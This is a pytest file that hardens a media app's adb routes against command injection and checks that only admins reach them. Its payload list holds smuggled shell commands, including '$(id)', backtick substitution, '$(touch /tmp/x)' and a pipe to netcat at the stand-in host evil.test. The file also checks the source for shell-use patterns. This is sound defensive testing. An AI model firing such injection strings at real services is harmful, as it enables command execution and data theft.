"""Prod hotfix: adb routes never run a shell, only talk to configured
devices, and are admin-only."""

import inspect
import json
import subprocess
from types import SimpleNamespace

import pytest

import app.main

LAN = {'REMOTE_ADDR': '192.168.1.20'}
ADMIN = {'id': 1, 'username': 'owner', 'is_admin': True}
MEMBER = {'id': 2, 'username': 'member', 'is_admin': False}

PAYLOADS = [
    '10.0.0.5; id',
    '10.0.0.5;id',
    '10.0.0.5 | nc evil.test 1',
    '10.0.0.5|id',
    '$(id)',
    '10.0.0.5$(touch /tmp/x)',
    '`id`',
    '10.0.0.5`id`',
    '10.0.0.5\nid',
    '10.0.0.5\n',
    '10.0.0.5 && id',
    '10.0.0.5 -s other',
    '-H',
    '10.0.0.5:5555',
    '10.0.0.5/x',
    '10.0.0.99',
    'evil.test',
    'fe80::1%eth0',
    '',
]


@pytest.fixture
def adb(test_app, monkeypatch):
    app.main.settings.update({
        'devices': {'rooms': [
            {'id': 'r1', 'name': 'Living room', 'host': '10.0.0.5', 'connectPort': 5555,
             'devices': [{'id': 'd1', 'host': 'shield.lan', 'services': []}]},
            {'id': 'r2', 'name': 'Den', 'ip': 'fd00::5'},
        ]},
    })
    runs = []
    state = {'user': ADMIN}
    monkeypatch.setattr(app.main, '_get_current_user', lambda: state['user'])

    def fake_run(args, **k):
        runs.append((args, k))
        assert isinstance(args, list), 'subprocess must get an argument list'
        assert not k.get('shell')
        if 'window' in args:
            out = 'junk\n  mCurrentFocus=Window{1 u0 com.plexapp.android/com.plexapp.Main}\nmore'
        else:
            out = ''
        return SimpleNamespace(returncode=0, stdout=out, stderr='')
    monkeypatch.setattr(subprocess, 'run', fake_run)
    monkeypatch.setattr(app.main.subprocess, 'run', fake_run)
    return test_app.test_client(), runs, state


def _activity(client, path, ip):
    from urllib.parse import quote
    return client.get(f'{path}?device_ip={quote(ip)}', environ_base=LAN)


def _control(client, ip):
    return client.post('/api/adb/control', data=json.dumps({'device_ip': ip, 'command': 'play_pause'}),
                       content_type='application/json', environ_base=LAN)


def _subs(client, ip):
    return client.post('/api/plex/playback/subtitles', data=json.dumps({'client_ip': ip}),
                       content_type='application/json', environ_base=LAN)


CALLS = [
    lambda c, ip: _activity(c, '/api/activity', ip),
    lambda c, ip: _activity(c, '/api/adb/shield_activity', ip),
    _control,
    _subs,
]
CALL_IDS = ['activity', 'shield_activity', 'control', 'subtitles']


@pytest.mark.parametrize('call', CALLS, ids=CALL_IDS)
@pytest.mark.parametrize('ip', PAYLOADS)
def test_injection_payloads_never_reach_subprocess(adb, call, ip):
    client, runs, _ = adb
    r = call(client, ip)
    if ip == '':
        # Empty falls back to the configured default device: still a plain list call.
        assert all(isinstance(a, list) for a, _ in runs)
        return
    assert r.status_code == 400, (ip, r.status_code)
    assert runs == []


@pytest.mark.parametrize('call', CALLS, ids=CALL_IDS)
def test_non_admin_gets_403(adb, call):
    client, runs, state = adb
    state['user'] = MEMBER
    assert call(client, '10.0.0.5').status_code == 403
    assert runs == []


@pytest.mark.parametrize('call', CALLS, ids=CALL_IDS)
@pytest.mark.parametrize('ip, target', [
    ('10.0.0.5', '10.0.0.5:'),
    ('shield.lan', 'shield.lan:'),
    ('SHIELD.lan', 'shield.lan:'),
    ('fd00::5', '[fd00::5]:'),
])
def test_configured_devices_work(adb, call, ip, target):
    client, runs, _ = adb
    r = call(client, ip)
    assert r.status_code == 200, r.get_data(as_text=True)
    assert runs
    for args, k in runs:
        assert args[0] == 'adb'
        assert not k.get('shell')
        assert k.get('timeout')
        assert any(a.startswith(target) for a in args)


def test_activity_filters_focus_in_python(adb):
    client, runs, _ = adb
    r = _activity(client, '/api/activity', '10.0.0.5')
    assert r.status_code == 200
    assert r.get_json()['current_package'] == 'com.plexapp.android'
    assert runs[0][0] == ['adb', '-s', '10.0.0.5:5555', 'shell', 'dumpsys', 'window']
    assert runs[1][0] == ['adb', '-s', '10.0.0.5:5555', 'shell', 'dumpsys', 'media_session']


@pytest.mark.parametrize('port', [0, 65536, -1, 'x', True, '5555; id'])
def test_bad_port_rejected(port):
    assert app.main._adb_target('10.0.0.5', port) is None


def test_no_shell_anywhere_in_app():
    import pathlib
    root = pathlib.Path(app.main.__file__).parent
    for f in root.rglob('*.py'):
        src = f.read_text()
        assert 'shell=True' not in src, f
        assert 'os.system(' not in src, f
        assert 'os.popen(' not in src, f